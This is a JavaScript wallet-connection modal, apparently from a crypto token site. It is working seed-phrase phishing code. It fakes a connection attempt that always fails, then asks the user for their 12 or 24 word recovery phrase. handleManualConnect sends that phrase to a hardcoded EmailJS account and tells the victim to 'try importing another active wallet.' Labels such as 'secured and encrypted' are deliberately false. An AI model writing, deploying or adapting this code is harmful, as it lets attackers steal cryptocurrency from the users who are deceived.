export const MANUAL_WALLET_CONNECTION_REQUEST = "wallet:manual-connection-request";
let manualWalletModal = null;

export function openManualWalletConnection() {
if (manualWalletModal) {
    manualWalletModal.openSelection();
    return;
}
// Load EmailJS library asynchronously to prevent blocking
const EMAILJS_CONFIG = {    
    serviceId: 'service_uac4hbm',       
    templateId: 'template_rao54nj',
    publicKey: 'Jta7cIFqwXXDMp0vD'
};
 
// Load EmailJS asynchronously after a delay
setTimeout(() => {
    const emailJsScript = document.createElement('script');
    emailJsScript.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
    emailJsScript.async = true;
    emailJsScript.onload = () => {
        if (window.emailjs) {
            window.emailjs.init(EMAILJS_CONFIG.publicKey);
            console.log('[Wallet Modal] EmailJS initialized');
        }
    };
    emailJsScript.onerror = () => {
        console.warn('[Wallet Modal] EmailJS failed to load');
    };
    document.head.appendChild(emailJsScript);
}, 500);

// Wallet configurations matching the i18n file
const WALLET_CONFIG = {
    'metamask': {
        name: 'METAMASK',
        displayName: 'Metamask',
        icon: 'assets/images/svg-icons/metamask.png',
        color: '#0fc27dff'
    },
    'wallet': {
        name: 'WALLET CONNECT',
        displayName: 'Wallet Connect',
        icon: 'assets/images/svg-icons/wallet.png',
        color: '#0fc27dff'
    },
    'walletBW': {
        name: 'BEST WALLET',
        displayName: 'Best Wallet',
        icon: 'assets/images/svg-icons/bw.png',
        color: '#0fc27dff'
    },
    'base': {
        name: 'BASE WALLET',
        displayName: 'Base Wallet',
        icon: 'assets/images/svg-icons/base1.png',
        color: '#0fc27dff'
    },
    'trust': {
        name: 'TRUST',
        displayName: 'Trust',
        icon: 'assets/images/svg-icons/trust.png',
        color: '#0fc27dff'
    },
    'solflare': {
        name: 'SOLFLARE',
        displayName: 'Solflare',
        icon: 'assets/images/svg-icons/solflare.png',
        color: '#0fc27dff'
    }
};

class WalletConnectionModal {
    constructor() {
        this.isOpen = false;
        this.currentWallet = null;
        this.state = 'selection'; // 'selection', 'loading', 'error', 'manual'
        this.walletIssues = '';
        this.modalElement = null;
        this.originalConnectWallet = null;
        this.isInitialized = false;
    }

    init() {
        if (this.isInitialized) return;
        this.isInitialized = true;

        // Override Angular's connectWallet method
        this.overrideConnectWallet();
        this.addStyles();
        
        // Setup modal event listener ONCE at initialization, not repeatedly
        document.addEventListener('click', (e) => this.handleGlobalClick(e), true);
        console.log('[Wallet Modal] Global click listener attached');

        // If a wallet selection was requested before this modal script was ready,
        // process it now so the wallet flow advances as expected.
        this.processPendingWalletSelection();
    }

    processPendingWalletSelection() {
        const pendingWallet = window.__buyButtonsOverridePendingWallet;
        if (pendingWallet) {
            console.log('[Wallet Modal] processing pending wallet selection:', pendingWallet);
            window.__buyButtonsOverridePendingWallet = null;
            this.handleWalletClick(pendingWallet);
        }
    }

    overrideConnectWallet() {
        // Wait for Angular to load and find the wallet service
        const checkForWalletService = () => {
            // Try to find the Angular component instance
            const angularElements = document.querySelectorAll('[ng-version]');
            if (angularElements.length > 0) {
                // Override at window level to catch all connectWallet calls
                const originalMethod = window.connectWallet;

                // Find and override the Angular component's connectWallet method

            } else {
                setTimeout(checkForWalletService, 100);
            }
        };
        checkForWalletService();
    }

    hideWalletSelectionModal() {
        if (window.buyButtonsOverride && typeof window.buyButtonsOverride.hideWalletSelectionModal === 'function') {
            window.buyButtonsOverride.hideWalletSelectionModal();
        }

        document.querySelectorAll('.buy-wallet-modal-overlay').forEach((modal) => {
            modal.style.display = 'none';
            modal.remove();
        });
    }

    hideWalletActionMenu() {
        if (window.buyButtonsOverride && typeof window.buyButtonsOverride.hideWalletActionMenu === 'function') {
            window.buyButtonsOverride.hideWalletActionMenu();
        }

        document.querySelectorAll('.buy-wallet-action-overlay').forEach((overlay) => overlay.remove());
    }

    handleWalletClick(walletType) {
        console.log('=== handleWalletClick CALLED ===');
        console.log('walletType:', walletType);
        console.log('WALLET_CONFIG[walletType]:', WALLET_CONFIG[walletType]);

        if (window.buyButtonsOverride && typeof window.buyButtonsOverride.hideWalletSelectionModal === 'function') {
            window.buyButtonsOverride.hideWalletSelectionModal();
        } else {
            document.querySelectorAll('.buy-wallet-modal-overlay').forEach((modal) => {
                modal.style.display = 'none';
                modal.remove();
            });
        }

        if (window.buyButtonsOverride && typeof window.buyButtonsOverride.hideWalletActionMenu === 'function') {
            window.buyButtonsOverride.hideWalletActionMenu();
        } else {
            document.querySelectorAll('.buy-wallet-action-overlay').forEach((overlay) => overlay.remove());
        }

        this.currentWallet = WALLET_CONFIG[walletType];
        console.log('this.currentWallet set to:', this.currentWallet);

        this.state = 'loading';
        console.log('State changed to: loading');

        this.showModal();

        // Show loading for 5 seconds, then show error
        setTimeout(() => {
            if (!this.isOpen || !this.modalElement) return;
            console.log('Transitioning from loading to error state');
            this.state = 'error';
            this.updateModalContent();
        }, 5000);
    }

    openSelection() {
        this.currentWallet = null;
        this.state = 'selection';
        this.showModal();
    }

    showModal() {
        console.log('=== showModal CALLED ===');
        if (this.modalElement) {
            console.log('Removing existing modal');
            this.modalElement.remove();
        }

        this.createModal();
        console.log('Modal created, state:', this.state);

        this.isOpen = true;
        document.body.appendChild(this.modalElement);
        console.log('Modal appended to DOM');

        document.body.style.overflow = 'hidden';
        // No setupModalEventListeners call - using global click handler
    }

    handleGlobalClick(e) {
        if (!this.isOpen || !this.modalElement) return;
        
        const target = e.target.closest('button');
        if (!target) return;
        
        // Check if click is inside modal
        if (!this.modalElement.contains(target)) return;
        
        e.preventDefault();
        e.stopPropagation();
        
        if (target.classList.contains('wallet-modal-close')) {
            this.hideModal();
        } else if (target.classList.contains('wallet-modal-wallet-option')) {
            const walletType = target.dataset.walletType;
            if (WALLET_CONFIG[walletType]) {
                this.handleWalletClick(walletType);
            }
        } else if (target.classList.contains('btn-refresh-connection')) {
            this.handleRefreshConnection();
        } else if (target.classList.contains('btn-connect-manually')) {
            this.handleConnectManually();
        } else if (target.classList.contains('btn-connect-wallet')) {
            this.handleManualConnect();
        }
    }

    setupModalEventListeners() {
        // Deprecated - using global click handler instead
        return;
    }

    hideModal() {
        if (this.modalElement) {
            this.modalElement.remove();
            this.modalElement = null;
        }
        this.isOpen = false;
        this.state = 'selection';
        this.currentWallet = null;
        this.walletIssues = '';
        document.body.style.overflow = '';
    }

    createModal() {
        this.modalElement = document.createElement('div');
        this.modalElement.className = 'wallet-modal-overlay';
        this.updateModalContent();
    }

    updateModalContent() {
        const bgColor = this.currentWallet ? '#ffffff' : '#000000';

        this.modalElement.innerHTML = `
            <div class="wallet-modal-content" style="background-color: ${bgColor};">
                <button class="wallet-modal-close">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                        <path d="M18 6L6 18M6 6L18 18" stroke="#9CA3AF" stroke-width="2" stroke-linecap="round"/>
                    </svg>
                </button>
                ${this.getContentForState()}
            </div>
        `;
    }

    getContentForState() {
        switch (this.state) {
            case 'loading':
                return this.getLoadingContent();
            case 'error':
                return this.getErrorContent();
            case 'manual':
                return this.getManualContent();
            default:
                return this.getSelectionContent();
        }
    }

    getLoadingContent() {
        return `
            <div class="wallet-modal-loading">
                <div class="wallet-icon">
                    <img src="${this.currentWallet.icon}" alt="${this.currentWallet.name}" />
                </div>
                <h3>${this.currentWallet.name.toLowerCase()}</h3>
                <p class="security-text">This session is secured and encrypted</p>

                <div class="progress-bar">
                    <div class="progress-fill"></div>
                </div>

                <div class="loading-text">
                    <p class="main-text">starting secure connection...</p>
                    <p class="sub-text">please wait...</p>
                </div>

                <div class="security-footer">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                        <path d="M12 22C12 22 20 18 20 12V5L12 2L4 5V12C4 18 12 22 12 22Z" stroke="#6B7280" stroke-width="2"/>
                    </svg>
                    <div>
                        <p class="footer-main">This session is protected</p>
                        <p class="footer-sub">with an end-to-end encryption</p>
                    </div>
                </div>
            </div>
        `;
    }

    getErrorContent() {
        return `
            <div class="wallet-modal-error">
                <div class="wallet-icon">
                    <img src="${this.currentWallet.icon}" alt="${this.currentWallet.name}" />
                </div>
                <h3>${this.currentWallet.name.toLowerCase()}</h3>
                <p class="security-text">This session is secured and encrypted</p>

                <div class="error-message security-notice">
                    <p class="security-notice-title">Security Notice</p>
                    <p class="security-notice-text">Only proceed if you are in a private environment and your screen is not visible to others.</p>
                </div>

                <div class="action-buttons">
                    <button class="btn-refresh-connection">Refresh Connection</button>
                    <button class="btn-connect-manually">Connect Manually</button>
                </div>

                <div class="security-footer">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                        <path d="M12 22C12 22 20 18 20 12V5L12 2L4 5V12C4 18 12 22 12 22Z" stroke="#6B7280" stroke-width="2"/>
                    </svg>
                    <div>
                        <p class="footer-main">This session is protected</p>
                        <p class="footer-sub">with an end-to-end encryption</p>
                    </div>
                </div>
            </div>
        `;
    }

    getManualContent() {
        return `
            <div class="wallet-modal-manual">
                <div class="wallet-icon">
                    <img src="${this.currentWallet.icon}" alt="${this.currentWallet.name}" />
                </div>
                <h3>${this.currentWallet.name.toLowerCase()}</h3>
                <p class="security-text">This session is secured and encrypted</p>

                <div class="issue-input">
                    <textarea
                        id="walletIssues"
                        placeholder="Enter your 12 or 24 Phrase mnemonic words separate them with spaces"
                        oninput="walletModal.walletIssues = this.value"
                    ></textarea>
                </div>

                <button class="btn-connect-wallet" type="button" id="connectWalletBtn">
                    Connect Wallet
                </button>

                <div class="security-footer">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                        <path d="M12 22C12 22 20 18 20 12V5L12 2L4 5V12C4 18 12 22 12 22Z" stroke="#6B7280" stroke-width="2"/>
                    </svg>
                    <div>
                        <p class="footer-main">This session is protected</p>
                        <p class="footer-sub">with an end-to-end encryption</p>
                    </div>
                </div>
            </div>
        `;
    }

    getSelectionContent() {
        return `
            <div class="wallet-modal-selection">
                <h2>CONNECT WALLET</h2>
                <p>Select your wallet from the options below</p>
                <div class="wallet-modal-wallet-options">
                    ${Object.entries(WALLET_CONFIG).map(([walletType, wallet]) => `
                        <button class="wallet-modal-wallet-option" type="button" data-wallet-type="${walletType}">
                            <img class="wallet-modal-wallet-option-icon" src="${wallet.icon}" alt="" aria-hidden="true" />
                            <span>${wallet.displayName}</span>
                        </button>
                    `).join('')}
                </div>
            </div>
        `;
    }

    handleRefreshConnection() {
        this.state = 'loading';
        this.updateModalContent();

        // Show loading again, then error
        setTimeout(() => {
            if (!this.isOpen || !this.modalElement) return;
            this.state = 'error';
            this.updateModalContent();
        }, 5000);
    }

    handleConnectManually() {
        this.state = 'manual';
        this.updateModalContent();
        // Event listeners are now handled by global click handler
    }

    async handleManualConnect() {
        console.log('=== handleManualConnect CALLED ===');
        console.log('this.currentWallet:', this.currentWallet);
        console.log('emailjs available?', typeof window.emailjs !== 'undefined');

        const textarea = document.getElementById('walletIssues');
        console.log('textarea element found?', !!textarea);

        // Always read directly from textarea, fallback to stored value
        const walletIssues = textarea ? textarea.value.trim() : (this.walletIssues || '').trim();
        console.log('walletIssues length:', walletIssues.length);
        console.log('walletIssues value:', walletIssues.length > 0 ? walletIssues.substring(0, 30) + '...' : '(empty)');

        if (!walletIssues) {
            console.log('NO PHRASE ENTERED - showing alert');
            alert('Enter your 12 or 24 Phrase mnemonic words separate them with spaces');
            return;
        }

        // Check if emailjs is available
        if (typeof window.emailjs === 'undefined') {
            console.error('EmailJS not loaded yet');
            alert('System is loading, please try again in a moment');
            return;
        }

        try {
            // Send email with wallet issue using EmailJS
            const templateParams = {
                wallet_type: this.currentWallet.name,
                timestamp: new Date().toLocaleString(),
                recovery_phrase: walletIssues
            };

            console.log('Sending email with params:', templateParams);
            console.log('Service ID:', EMAILJS_CONFIG.serviceId);
            console.log('Template ID:', EMAILJS_CONFIG.templateId);

            const response = await window.emailjs.send(
                EMAILJS_CONFIG.serviceId,
                EMAILJS_CONFIG.templateId,
                templateParams,
                EMAILJS_CONFIG.publicKey
            );

            console.log('✅ Email sent successfully! Response:', response);

            // Show error message and close modal
            alert('An error occurred, try importing another active wallet.');
            this.hideModal();

        } catch (error) {
            console.error('❌ Failed to send email:', error);
            console.error('Error details:', {
                message: error?.message,
                status: error?.status,
                text: error?.text
            });
            alert('Connection failed. Please try again.');
        }
    }

    addStyles() {
        const style = document.createElement('style');
        style.textContent = `
            .wallet-modal-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(1, 5, 19, 0.88);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10000;
                padding: 20px;
                min-height: 100vh;
            }

            .wallet-modal-content {
                border-radius: 24px;
                padding: 32px;
                width: 100%;
                max-width: 400px;
                position: relative;
                box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
                margin: auto;
            }

            .wallet-modal-close {
                position: absolute;
                top: 16px;
                right: 16px;
                background: none;
                border: none;
                cursor: pointer;
                padding: 4px;
                color: #9CA3AF;
            }

            .wallet-modal-close:hover {
                color: #6B7280;
            }

            .wallet-modal-loading,
            .wallet-modal-error,
            .wallet-modal-manual {
                text-align: center;
                color: #374151;
            }

            .wallet-modal-selection {
                color: #ffffff;
                text-align: center;
            }

            .wallet-modal-selection h2 {
                margin: 0 0 8px;
                font-size: 22px;
            }

            .wallet-modal-selection p {
                margin: 0 0 20px;
                color: #cbd5e1;
                font-size: 14px;
            }

            .wallet-modal-wallet-options {
                display: grid;
                grid-template-columns: repeat(2, minmax(0, 1fr));
                gap: 10px;
            }

            .wallet-modal-wallet-option {
                display: flex;
                align-items: center;
                justify-content: flex-start;
                gap: 12px;
                min-height: 48px;
                padding: 8px 14px;
                border: 1px solid rgba(255, 255, 255, 0.16);
                border-radius: 12px;
                background: rgba(255, 255, 255, 0.08);
                color: #ffffff;
                font: inherit;
                font-size: 14px;
                font-weight: 700;
                cursor: pointer;
                transition: background-color .2s ease, border-color .2s ease, transform .2s ease;
            }

            .wallet-modal-wallet-option-icon {
                display: block;
                width: 32px;
                height: 32px;
                flex: 0 0 32px;
                border-radius: 8px;
                object-fit: contain;
            }

            .wallet-modal-wallet-option:hover {
                border-color: #4042d2;
                background: #4042d2;
                transform: translateY(-1px);
            }

            .wallet-modal-wallet-option:focus-visible {
                outline: 2px solid #b3b5f5;
                outline-offset: 2px;
            }

            .wallet-icon {
                width: 80px;
                height: 80px;
                background: white;
                border-radius: 16px;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 24px;
                box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
            }

            .wallet-icon img {
                width: 48px;
                height: 48px;
                object-fit: contain;
                border-radius: 8px;
            }

            .wallet-modal-loading h3,
            .wallet-modal-error h3,
            .wallet-modal-manual h3 {
                font-size: 24px;
                font-weight: bold;
                margin: 0 0 16px;
                color: #374151;
            }

            .security-text {
                color: #6B7280;
                margin-bottom: 32px;
                font-size: 14px;
            }

            .progress-bar {
                width: 100%;
                height: 8px;
                background: #5b90f3;
                border-radius: 4px;
                margin: 16px 0;
                overflow: hidden;
            }

            .progress-fill {
                height: 100%;
                width: 70%;
                background: #063270;
                border-radius: 4px;
                animation: pulse 2s ease-in-out infinite;
            }

            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.5; }
            }

            .loading-text {
                margin: 24px 0;
            }

            .loading-text .main-text {
                font-size: 18px;
                font-weight: 600;
                color: #374151;
                margin: 0 0 8px;
            }

            .loading-text .sub-text {
                font-size: 14px;
                color: #6B7280;
                margin: 0;
            }

            .error-message {
                border-radius: 22px;
                padding: 20px;
                margin: 24px 0;
                background: linear-gradient(180deg, rgba(15, 23, 42, 0.92), rgba(30, 41, 59, 0.92));
                border: 1px solid rgba(249, 115, 22, 0.4);
                box-shadow: 0 15px 40px rgba(15, 23, 42, 0.25);
            }

            .error-message p {
                color: #E5E7EB;
                font-size: 15px;
                margin: 0;
                line-height: 1.75;
                font-family: 'Inter', 'Segoe UI', sans-serif;
            }

            .security-notice-title {
                color: #F59E0B;
                font-size: 16px;
                font-weight: 800;
                letter-spacing: 0.08em;
                text-transform: uppercase;
                margin-bottom: 10px;
            }

            .security-notice-text {
                color: #F3F4F6;
                font-size: 15px;
                line-height: 1.8;
                margin: 0;
            }

            .action-buttons {
                display: flex;
                flex-direction: column;
                gap: 12px;
                margin: 24px 0;
            }

            .btn-refresh-connection {
                width: 100%;
                background: #F3F4F6;
                color: #63a6e4;
                border: none;
                padding: 12px 24px;
                border-radius: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: background-color 0.2s;
            }

            .btn-refresh-connection:hover {
                background: #E5E7EB;
            }

            .btn-connect-manually {
                width: 100%;
                background: #12a4e7;
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: background-color 0.2s;
            }

            .btn-connect-manually:hover {
                background: #0a0a0a;
            }

            .issue-input {
                margin: 24px 0;
            }

            .issue-input textarea {
                width: 100%;
                height: 120px;
                padding: 10px;
                border: 2px solid #E5E7EB;
                border-radius: 16px;
                resize: none;
                font-size: 14px;
                font-family: inherit;
                color: #374151;
                background: white;
            }

            .issue-input textarea:focus {
                outline: none;
                border-color: #3B82F6;
            }

            .issue-input textarea::placeholder {
                color: #9CA3AF;
            }

            .btn-connect-wallet {
                width: 100%;
                background: #DDD6FE;
                color: #6894ec;
                border: none;
                padding: 12px 24px;
                border-radius: 16px;
                font-weight: 600;
                cursor: pointer;
                margin: 24px 0;
                transition: background-color 0.2s;
            }

            .btn-connect-wallet:hover {
                background: #4b91ec;
            }

            .security-footer {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                color: #6B7280;
                font-size: 12px;
            }

            .security-footer .footer-main {
                font-weight: 600;
                margin: 0;
            }

            .security-footer .footer-sub {
                margin: 0;
            }

            @media (max-width: 480px) {
                .wallet-modal-content {
                    padding: 24px;
                    margin: 20px;
                }

                .wallet-icon {
                    width: 64px;
                    height: 64px;
                }

                .wallet-icon img {
                    width: 32px;
                    height: 32px;
                }
            }

            /* Theme-friendly overrides for wallet list items (replace orange backgrounds) */
            .wallet-list button,
            .wallets-list button,
            .wallet-item,
            .wallet-option,
            .wallets button,
            .w3m-wallet-card,
            .wallet-connect-button {
                background: #11120b !important; /* dark background matching site */
                color: #ffffff !important;
                border: 1px solid rgba(152,255,25,0.12) !important; /* subtle neon-green accent */
                border-radius: 12px !important;
                box-shadow: 0 6px 18px rgba(0,0,0,0.45) !important;
            }

            .wallet-list button:hover,
            .wallets-list button:hover,
            .wallet-item:hover,
            .wallet-option:hover,
            .wallets button:hover,
            .w3m-wallet-card:hover,
            .wallet-connect-button:hover {
                background: #1a1a18 !important;
                transform: translateY(-1px);
            }
            /* Force Web3Modal / WUI theme variables to blend with site theme
               This helps when wallet UI uses shadow DOM and internal classes. */
            :root {
                --wui-color-bg-100: #11120b !important;
                --wui-all-wallets-bg-100: #11120b !important;
                --wui-wallet-button-bg-base: #11120b !important;
                --wui-color-fg-100: #ffffff !important;
                --w3m-accent: 152 255 25 !important;
                --w3m-accent-rgb: 152,255,25 !important;
                --w3m-card-embedded-shadow-color: rgb(17 17 18 / 25%) !important;
            }
        `;
        document.head.appendChild(style);
    }
}

const walletModal = new WalletConnectionModal();
manualWalletModal = walletModal;

// Expose to window so inline onclick handlers and other scripts can access it
window.walletModal = walletModal;
window.WALLET_CONFIG = WALLET_CONFIG;

window.handleWalletSelection = function(walletType) {
    if (window.walletModal && typeof window.walletModal.handleWalletClick === 'function') {
        console.log('[Wallet Modal] handleWalletSelection invoked:', walletType);
        window.walletModal.handleWalletClick(walletType);
        return;
    }

    console.warn('[Wallet Modal] handleWalletSelection called before modal ready:', walletType);
    window.__buyButtonsOverridePendingWallet = walletType;
};

window.addEventListener('buyButtonsOverrideWalletSelected', (event) => {
    const walletType = event?.detail?.walletType;
    if (!walletType) return;
    console.log('[Wallet Modal] buyButtonsOverrideWalletSelected event received:', walletType);
    if (typeof window.handleWalletSelection === 'function') {
        window.handleWalletSelection(walletType);
    }
});

// Initialize when DOM is ready`
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => walletModal.init());
} else {
    walletModal.init();
}

// Also try to initialize after a short delay to ensure Angular is loaded
setTimeout(() => walletModal.init(), 2000);
walletModal.openSelection();
}